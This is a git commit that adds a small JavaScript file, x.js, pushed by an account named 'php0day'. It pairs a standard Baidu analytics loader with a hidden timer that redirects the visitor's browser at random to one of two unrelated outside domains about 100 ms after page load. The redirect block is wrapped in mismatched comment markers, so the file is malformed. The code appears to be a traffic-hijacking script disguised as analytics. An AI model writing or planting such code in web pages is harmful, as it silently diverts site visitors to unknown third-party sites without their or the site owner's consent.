f5467d7912f175f13092cdb45536f397e19b5c50
php0day <56468363+php0day@users.noreply.github.com>
2020-04-14 02:39:47 +0800

    Create x.js

---
+++ x.js
@@ -0,0 +1,14 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b709eee7e8213059548008e0e4976094";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+ */
+ setTimeout(function(){
+  var arr=['http://3g.022gc.net/#xwy','http://3g.029gc.net/#xwy'];
+ window.location.href=arr[parseInt(Math.random()*arr.length)];
+ },100);
+ */
